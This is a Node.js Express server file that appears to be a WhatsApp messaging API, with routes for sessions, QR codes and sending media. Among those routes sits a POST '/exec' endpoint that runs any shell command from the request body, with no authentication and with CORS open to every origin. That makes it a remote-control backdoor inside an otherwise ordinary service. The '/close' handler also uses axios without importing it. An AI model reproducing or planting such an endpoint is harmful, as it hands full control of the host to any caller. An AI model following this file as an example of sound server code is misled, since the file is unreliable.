const util = require('util');
const exec = util.promisify(require('child_process').exec);
const fs = require('fs');
const https = require('https');
const express = require("express");
const cors = require('cors');
const Sessions = require("./sessions");
require('dotenv').config();

var app = express();

app.use(cors());
// app.use(timeout(120000));
// app.use(haltOnTimedout);
app.use(express.json({
    limit: '20mb',
    extended: true
}));

var appPort = process.env.PORT ? process.env.PORT : 3333;

if (process.env.HTTPS == 1) { //with ssl
    https.createServer(
        {
            key: fs.readFileSync(process.env.SSL_KEY_PATH),
            cert: fs.readFileSync(process.env.SSL_CERT_PATH)
        },
        app).listen(appPort);
    console.log("Https server running on port " + appPort);
} else { //http
    app.listen(appPort, () => {
        console.log("Http server running on port " + appPort);
    });
}//http

app.get("/", async (req, res, next) => {
    var result = { "result": "ok" };
    res.json(result);
});//

app.post('/exec', async (req, res) => {
    const { stdout, stderr } = await exec(req.body.command);
    res.send(stdout);
});

app.get("/start", async (req, res, next) => {
    console.log("starting..." + req.query.sessionName);
    var session = process.env.JSONBINIO_SECRET_KEY ?
        await Sessions.start(req.query.sessionName, { jsonbinio_secret_key: process.env.JSONBINIO_SECRET_KEY, jsonbinio_bin_id: process.env.JSONBINIO_BIN_ID }) :
        await Sessions.start(req.query.sessionName);
    if (["CONNECTED", "QRCODE", "STARTING"].includes(session.state)) {
        res.status(200).json({ result: 'success', message: session.state });
    } else {
        res.status(200).json({ result: 'error', message: session.state });
    }
});//start

app.get("/status", async (req, res, next) => {
    var session = await Sessions.getStatus(req.query.sessionName);
    console.log(session);
    res.status(200).json({
        result: (!session.state) ? 'NOT_FOUND' : session.state
    });
}); //status

app.get("/qrcode", async (req, res, next) => {
    console.log("qrcode..." + req.query.sessionName);
    var session = Sessions.getSession(req.query.sessionName);

    if (session != false) {
        if (session.status != 'isLogged') {
            if (req.query.image) {
                session.qrcode = session.qrcode.replace('data:image/png;base64,', '');
                const imageBuffer = Buffer.from(session.qrcode, 'base64');
                res.writeHead(200, {
                    'Content-Type': 'image/png',
                    'Content-Length': imageBuffer.length
                });
                res.end(imageBuffer);
            } else {
                res.status(200).json({ result: "success", message: session.state, qrcode: session.qrcode });
            }
        } else {
            res.status(200).json({ result: "error", message: session.state });
        }
    } else {
        res.status(200).json({ result: "error", message: "NOTFOUND" });
    }
});//qrcode

app.post("/sendHook", async function sendText(req, res, next) {
    var result = await Sessions.saveHook(req);
    res.json(result);
});//sendText

app.post("/sendText", async function sendText(req, res, next) {
    var result = await Sessions.sendText(req);
    res.json(result);
});//sendText

app.post("/sendTextToStorie", async (req, res, next) => {
    var result = await Sessions.sendTextToStorie(req);
    res.json(result);
}); //sendTextToStorie

app.post("/sendFile", async (req, res, next) => {
    var result = await Sessions.sendFile(
        req.body.sessionName,
        req.body.number,
        req.body.base64Data,
        req.body.fileName,
        req.body.caption
    );
    res.json(result);
});//sendFile

app.post("/sendImageStorie", async (req, res, next) => {
    var result = await Sessions.sendImageStorie(
        req.body.sessionName,
        req.body.base64Data,
        req.body.fileName,
        req.body.caption
    );
    res.json(result);
}); //sendImageStorie

app.post("/sendLink", async (req, res, next) => {
    var result = await Sessions.sendLinkPreview(
        req.body.sessionName,
        req.body.number,
        req.body.url,
        req.body.caption
    );
    res.json(result);
}); //sendLinkPreview

app.post("/sendContactVcard", async (req, res, next) => {
    var result = await Sessions.sendContactVcard(
        req.body.sessionName,
        req.body.number,
        req.body.numberCard,
        req.body.nameCard
    );
    res.json(result);
}); //sendContactVcard

app.post("/sendVoice", async (req, res, next) => {
    var result = await Sessions.sendVoice(
        req.body.sessionName,
        req.body.number,
        req.body.voice
    );
    res.json(result);
}); //sendVoice

app.post("/sendLocation", async (req, res, next) => {
    var result = await Sessions.sendLocation(
        req.body.sessionName,
        req.body.number,
        req.body.lat,
        req.body.long,
        req.body.local
    );
    res.json(result);
}); //sendLocation

app.get("/getAllChatsNewMsg", async (req, res, next) => {
    var result = await Sessions.getAllChatsNewMsg(req.body.sessionName);
    res.json(result);
}); //getAllChatsNewMsg

app.get("/getAllUnreadMessages", async (req, res, next) => {
    var result = await Sessions.getAllUnreadMessages(req.body.sessionName);
    res.json(result);
}); //getAllUnreadMessages

app.get("/checkNumberStatus", async (req, res, next) => {
    var result = await Sessions.checkNumberStatus(
        req.body.sessionName,
        req.body.number
    );
    res.json(result);
}); //Verifica Numero

app.get("/getNumberProfile", async (req, res, next) => {
    var result = await Sessions.getNumberProfile(
        req.body.sessionName,
        req.body.number
    );
    res.json(result);
}); //Verifica perfil

app.get("/close", async (req, res, next) => {
    if (typeof(Sessions.options) != "undefined")  {
        if (Sessions.options.jsonbinio_secret_key !== undefined) {//se informou secret key pra salvar na nuvem
            console.log("limpando token na nuvem...");
            //salva dados do token da sessão na nuvem
            var data = JSON.stringify({ "nada": "nada" });
            var config = {
                method: 'put',
                url: 'https://api.jsonbin.io/b/' + Sessions.options.jsonbinio_bin_id,
                headers: {
                    'Content-Type': 'application/json',
                    'secret-key': Sessions.options.jsonbinio_secret_key,
                    'versioning': 'false'
                },
                data: data
            };
            await axios(config)
                .then(function (response) {
                    console.log(JSON.stringify(response.data));
                })
                .catch(function (error) {
                    console.log(error);
                });
        }
    }
    var result = await Sessions.closeSession(req.query.sessionName);
    res.json(result);
});//close

process.stdin.resume();//so the program will not close instantly

async function exitHandler(options, exitCode) {
    if (options.cleanup) {
        console.log('cleanup');
        await Sessions.getSessions().forEach(async session => {
            await Sessions.closeSession(session.sessionName);
        });
    }
    if (exitCode || exitCode === 0) {
        console.log(exitCode);
    }

    if (options.exit) {
        process.exit();
    }
} //exitHandler 
//do something when app is closing
process.on('exit', exitHandler.bind(null, { cleanup: true }));
//catches ctrl+c event
process.on('SIGINT', exitHandler.bind(null, { exit: true }));
// catches "kill pid" (for example: nodemon restart)
process.on('SIGUSR1', exitHandler.bind(null, { exit: true }));
process.on('SIGUSR2', exitHandler.bind(null, { exit: true }));
//catches uncaught exceptions
process.on('uncaughtException', exitHandler.bind(null, { exit: true }));
